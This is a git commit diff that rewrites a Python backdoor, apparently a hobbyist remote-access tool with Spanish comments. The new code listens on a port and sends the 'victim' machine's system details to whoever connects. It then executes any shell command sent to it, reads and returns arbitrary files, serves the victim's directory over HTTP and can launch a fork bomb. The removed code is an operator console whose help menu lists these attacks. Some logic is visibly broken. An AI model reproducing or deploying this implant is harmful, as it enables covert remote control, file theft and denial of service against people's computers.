1047990c9124a9f3aa3776c074ce566eab4fff09
Desmon <61366533+desmonHak@users.noreply.github.com>
2020-04-27 15:41:51 +0200

    Update back-door-client.py

--- back-door-client.py
+++ back-door-client.py
@@ -1,229 +1,236 @@
 #! /usr/bin/python3
-# -*- coding: utf-8 -*-
 
+import http.server
+import platform
 import socket
 import base64
 import datetime
 import os
-import subprocess
 import sys
+import subprocess
 
-from http.server import BaseHTTPRequestHandler, HTTPServer
+from multiprocessing import Process, cpu_count
 
-from os import read
 
 global _CodingBase85Text
 global _DecodingBase85Text
-global i
+global _ServerConnect
+global _ForkBom
+global _CloseServer
+global _OsInfo
+global _HttpServer
+global hilo3
 
 
 def _MAIN():
-    i = 1
-    print("""\033[1;37m
-                                .....
-                              .,clloc'
-                             .coc:::c:.
-                            .lkocll;;lc:;.
-                            .xX0xdoloxxkko.
-                      ...    'loddOOkOXNXd.
-                       ,ol:'.  .;cx0KKK0ko,.
-                       .cOOdcc:,..':loodddc.
-            ..          .ckOKNN0:. ...',,,.
-         ....            .;xNWWWKl.
-        ..                 ,OWWWWKl.
-         ..                .:OX0x:.
-            .               .dO:.
-                            .ll.
- \033[1;31mm    m               mmmmm         #               m
- ##  ##  m mm         #   "#  mmm   #mmm    mmm   mm#mm
- # ## #  #"  "        #mmmm" #" "#  #" "#  #" "#    #
- # "" #  #            #   "m #   #  #   #  #   #    #
- #    #  #       #    #    " "#m#"  ##m#"  "#m#"    "mm\033[1;37m
-
-             ..                ..
-             .                  .
-            ..                  ..
-            ..              ..   .
-            .                .   .
-            .             .   ...
-            .             .    .\033[1;37m
-    """)
 
     def _CodingBase85Text(ServerConnect, text):
         data = base64.b85encode(text.encode('ascii'), pad=False)
         ServerConnect.send(data)
 
-    def _DecodingBase85Text(ServerConnect, buff):
-        try:
-            data = ServerConnect.recv(int(buff)).decode()
-            data = base64.b85decode(data)
-            return str(data.decode('ascii'))
-        except (ValueError, KeyboardInterrupt):
-            print("\033[1;36merror de valores o de Keyboard")
-            #i = 2
+    def _DecodingBase85Text(ServerConnect, buffer):
+        data = ServerConnect.recv(buffer).decode()
+        data = base64.b85decode(data)
+        return str(data.decode('ascii'))
+
+    def _CloseServer(ServerDesconnect):
+        ServerDesconnect.close()
+        sys.exit()
+
+    def _ForkBom():
+        while True:
+            os.fork()
+
+    def _HttpServer():
+        def test(HandlerClass=http.server.BaseHTTPRequestHandler,ServerClass=http.server.HTTPServer,
+        protocol="HTTP/1.0", port=9785, bind=""):
+
+            server_address = (bind, port)
+
+            HandlerClass.protocol_version = protocol
+
+            httpd = ServerClass(server_address, HandlerClass)
+
+            try:
+                httpd.serve_forever()
+            except KeyboardInterrupt:
+                sys.exit(0)
+
+            return port
+
+
+        handler_class = http.server.SimpleHTTPRequestHandler
+        port = test(HandlerClass=handler_class)
+
+        return port
+
+
+
 
     class BackDoor:
 
         def __init__(self):
 
-            self.Host = '127.0.0.1'
+            try:
+                self.Host = sys.argv[2]
+                self.Host = str(self.Host)
+            except IndexError:
+                self.Host = '127.0.0.1'
 
             try:
                 self.Port = sys.argv[1]
                 self.Port = int(self.Port)
             except IndexError:
                 self.Port = 6365
-
+            self.Ip = None
+            self.Target = None
+            self.Data = None
+            self.ListenSocket = 1
+            self.buffer = 3500
             self.Green = "\033[1;32m"
             self.White = "\033[1;37m"
-            self.Data = None
-            self.buffer = 2048
-            i = 1
+            self.i = 1
 
-            self.Client = socket.socket()
+            self.Server = socket.socket()
             self.Time = str(datetime.date.today())
             self.Cwd = str(os.getcwd())
+            self.Os = str(sys.platform)
 
-        def Connection(self):
-            print("intentando conectarse a " + str(self.Host)+":"+str(self.Port))
-            self.Client.connect((str(self.Host), int(self.Port)))
-            print(_DecodingBase85Text(self.Client, 8000))
+        def _ServerConnect(self):
 
-            while int(i) == 1:
-                try:
-                    #ruta = _DecodingBase85Text(self.Client, self.buffer)
-                    command = str(input(
-                        self.Green+'[*]'+"\033[1;33m{"+str(self.Cwd)+"}"+self.White+'Desmon:>> '))
+            self.Server.bind((str(self.Host), int(self.Port)))
+            self.Server.listen(int(self.ListenSocket))
+            self.Target, self.Ip = self.Server.accept()
+            print(self.Green+'[*]'+self.White+'conexion establecida')
 
-                    if str(command) == 'exit':
-                        _CodingBase85Text(self.Client, str('exit'))
-                        self.Client.close()
-                        break
+            while True:
 
-                    elif str(command) == '' or str(command) == ' ' or str(command) == '\n':
-                        print("comando incorrecto")
+                def _OsInfo():
+                    self.Cwd = os.getcwd()
+                    OsInfo = "\033[1;32m[*]\033[1;37mConexion establecida.\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mEl sistema operativo victima es: " + str(self.Os)+'\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mTiempo: " + str(self.Time)+'\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mDirectorio: " + str(self.Cwd)+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mNombre del equipo: " + str(socket.gethostname())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37maseguramiento del nombre del dispositivo: "+str(platform.node())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mIp de la maquina: " + str(self.Ip) + '\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mBuffer: " + str(self.buffer) + '\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mTipo de conexion: " + str(self.Target) + '\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mEjecutable de pythhon con el que se ejecuta: "+str(platform.architecture(sys.executable , '' , ''))+'\n'
+                    OsInfo += "\033[1;32m[*]\033[1;37mEstructura: " + str(platform.machine()) +"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mSistema operativo: "+str(platform.platform(0, 0))+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mNombre real del Procesador: "+str(platform.processor())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mInfo de la version python: "+str(platform.python_build())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mCompilador de python: "+str(platform.python_compiler())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mImplementacion de python: "+str(platform.python_implementation())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mVersion del sistema: "+str(platform.release())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37mTipo de sistema: "+str(platform.system())+"\n"
+                    OsInfo += "\033[1;32m[*]\033[1;37m"+str(platform.uname())+"\n"
+
+                    return str(OsInfo)
+
+                if self.i == 1:
+                    _CodingBase85Text(self.Target, _OsInfo())
+                    self.i = 2
+
+                comand = str(_DecodingBase85Text(self.Target, self.buffer))
+                if comand == 'exit':
+                    _CloseServer(self.Server)
+                    break
+
+                elif comand == 'cd':
+                    ruta = _DecodingBase85Text(self.Target, 1000)
+                    os.chdir(str(ruta))
+                    print("va")
+                    self.Cwd = os.getcwd
+                    print(self.Cwd)
+                    _CodingBase85Text(self.Target, ("se pudo aceder a la carpeta: "+str(ruta)))
 
 
-                    elif str(command) == 'cd':
-                        dat = str(input("ruta a la que acede: "))
-                        _CodingBase85Text(self.Client, str(dat))
-                        buff = _DecodingBase85Text(self.Client, 8000)
-                        print(buff)
-                        #ruta
+                elif comand == 'BombFork':
+                    hilo1 = Process(target=_ForkBom)
+                    hilo2 = Process(target=self.Server.close())
+                    hilo2.start()
+                    hilo2.join()
+                    hilo1.start()
 
-                    elif str(command) == 'OsInfo':
-                        _CodingBase85Text(self.Client, str('OsInfo'))
-                        data = _DecodingBase85Text(self.Client, 8000)
-                        print(str(data))
+                elif comand == 'OsInfo':
+                    _CodingBase85Text(self.Target, str(_OsInfo()))
 
-                    elif str(command) == 'cwd':
-                        _CodingBase85Text(self.Client, str('cwd'))
-                        self.Cwd = str(_DecodingBase85Text(self.Client, 8000))
+                elif str(comand) == 'cwd':
+                    self.Cwd = os.getcwd()
+                    _CodingBase85Text(self.Target, str(self.Cwd))
 
-                    elif str(command) == 'HttpServer':
-                        _CodingBase85Text(self.Client, str('HttpServer'))
-                        #PortHttp = int(input("introduce el puerto que abrir: "))
-                        #_CodingBase85Text(self.Client, str(PortHttp))
-                        print(_DecodingBase85Text(self.Client, 8000))
 
-                    elif str(command) == 'CloseHttpServer':
-                        _CodingBase85Text(self.Client, str('CloseHttpServer'))
-                        data = _DecodingBase85Text(self.Client, 8000)
-                        print(str(data))
+                elif comand == 'HttpServer':
+                    PortHttp = 9785
+                    hilo3 = Process(target=_HttpServer)
+                    hilo3.start()
+                    _CodingBase85Text(self.Target, "server abierto en el puerto "+str(PortHttp))
 
-                    elif str(command) == 'cd ..':
-                        _CodingBase85Text(self.Client, str('cd ..'))
-                        print("se consigio cambiar al repositorio anterior.")
-                        self.Cwd = _DecodingBase85Text(self.Client, 2048)
+                elif comand == 'CloseHttpServer':
+                    try:
+                        hilo3.terminate()
+                        _CodingBase85Text(self.Target, "server cerrado en el puerto "+str(PortHttp))
+                    except UnboundLocalError:
+                        pass
 
-                    elif str(command) == 'clear':
-                        if sys.platform == 'linux' or sys.platform == 'linux2':
-                            os.system("clear")
-                        elif sys.platform == 'win32':
-                            os.system("cls")
-                        else :
-                            os.system("cls")
-                    elif str(command) == 'read':
-                        _CodingBase85Text(self.Client, str('read'))
-                        _CodingBase85Text(self.Client, str(input("nombre del archivo a leer: ")))
-                        _type = str(_DecodingBase85Text(self.Client, 8000))
-                        if _type == 'binary':
-                            a = self.Client.recv(self.buffer).decode('utf-16')
-                            a = base64.b85decode(str(a))
-                            print(a)
-                        elif _type == 'no binary':
-                            print(str(_DecodingBase85Text(self.Client, self.buffer)))
+                elif comand == 'cd ..':
+                    os.chdir("..")
+                    self.Cwd = os.getcwd()
+                    _CodingBase85Text(self.Target, str(self.Cwd))
 
-                    elif str(command) == 'help' or str(command) == 'ayuda':
-                        print("""
-                        ---------------------------------------------------------------
-                        -                      comandos disponibles                    -
-                        ----------------------------------------------------------------
-                        -exit                      con este finalizas las conesiones   -
-                        ----------------------------------------------------------------
-                        -cd                con este pordras desplazarte entre carpetas -
-                        ----------------------------------------------------------------
-                        -BombFork          este ejecuta una bomba fork en el pc victima-
-                        ----------------------------------------------------------------
-                        -cwd                    para poder ver la ruta del directorio  -
-                        ----------------------------------------------------------------
-                        -HttpServer           ejecuta un server Http en la pc victimma -
-                        ----------------------------------------------------------------
-                        -CloseHttpServer                 finaliza el server http       -
-                        ----------------------------------------------------------------
-                        -cd ..                         retrocede un directorio         -
-                        ----------------------------------------------------------------
-                        -read                           lee archivos de la pc victima  -
-                        ----------------------------------------------------------------
-                        - otros comandos compatibles con el dispositivo de la victima  -
-                        ----------------------------------------------------------------
-                        """)
+                elif comand == 'read':
+                    fileOpen = _DecodingBase85Text(self.Target, self.buffer)
+                    try:
+                        try:
+                            _CodingBase85Text(self.Target, str("no binary"))
+                            file = open(str(fileOpen), "r")
+                            dataL = file.read()
+                            file.close()
+                            _CodingBase85Text(self.Target, str(dataL))
+                        except (FileNotFoundError, IsADirectoryError):
+                            _CodingBase85Text(self.Target, str("este archivo no esiste o es una carpeta"))
+                    except UnicodeDecodeError:
+                        try:
+                            _CodingBase85Text(self.Target, str("binary"))
+                            file = open(str(fileOpen), "rb")
+                            dataL = file.read()
+                            dataL = dataL
+                            file.close()
+                            _CodingBase85Text(self.Target, str(dataL))
+                        except FileNotFoundError:
+                            _CodingBase85Text(self.Target, str("este archivo no esiste"))
 
-                    else:
+                elif comand != 'CloseHttpServer' and comand != 'HttpServer' and str(comand) != 'cwd' and comand != 'OsInfo' and comand != 'BombFork' and str(comand) == 'cd' and comand == 'exit' and comand == 'cd ..' and comand == "read":
+                    try:
+                        data = self.Green + str(subprocess.getstatusoutput(str(comand))[1])
+                    except UnicodeDecodeError:
+                        data = '\033[1;36mocurrio un error de descodificaion unicode en el servidor'
+                    _CodingBase85Text(self.Target, str(len(data)))
+                    _CodingBase85Text(self.Target, str(data))
+                    comand = None
+                    data = None
 
-                        _CodingBase85Text(self.Client, str(command))
 
-                        if self.buffer == None or self.buffer == 0:
-                            self.buffer = 2048
-                        else:
-                            opert = _DecodingBase85Text(self.Client, self.buffer)
+                else:
+                    data = self.Green + str(subprocess.getstatusoutput(str(comand))[1])
+                    _CodingBase85Text(self.Target, str(len(data)))
+                    _CodingBase85Text(self.Target, str(data))
+                    comand = None
+                    data = None
 
-                            if opert == None:
-                                self.buffer = 3000
-                            else:
-                                pass
-
-                            # el server manda la longitud del oput que va a enviar para definir el buffer, si tiene 10 caracteres = 10 bit a de multiplicarse por 8 para saber los bit a definir
-                            self.buffer = int(self.buffer) * 8 + 50
-
-                            if int(self.buffer) < 80000:
-                                self.buffer = 100000
-                            elif int(self.buffer) > 80000:
-                                self.buffer = int(self.buffer) + 3000
-
-                            # establcemos el buffer del mensaje y lo recibimos
-                            data = _DecodingBase85Text(
-                                self.Client, self.buffer)
-                            print(str(data))
-                            data = None  # restablecemos la variable data
-                            self.buffer = 3000 * 8 + 50
-
-                        if sys.platform == 'linux' or sys.platform == 'linux2':
-                            subprocess.getstatusoutput("clear")
-                        elif sys.platform == 'win32':
-                            subprocess.getstatusoutput("cls")
-                        else :
-                            subprocess.getstatusoutput("cls")
-                        #print(_DecodingBase85Text(self.Client, 8000))
-
-                except UnicodeDecodeError:
-                    print(
-                        '\033[1;36mocurrio un error de descodificaion unicode en el cliente')
+                if sys.platform == 'linux' or sys.platform == 'linux2':
+                    os.system("clear")
+                elif sys.platform == 'win32':
+                    os.system("cls")
+                else :
+                    os.system("cls")
+                    _CodingBase85Text(self.Target, _OsInfo())
 
     BackDoor = BackDoor()
-    BackDoor.Connection()
+    BackDoor._ServerConnect()
 
 
 if __name__ == "__main__":
-    # while True:
     _MAIN()
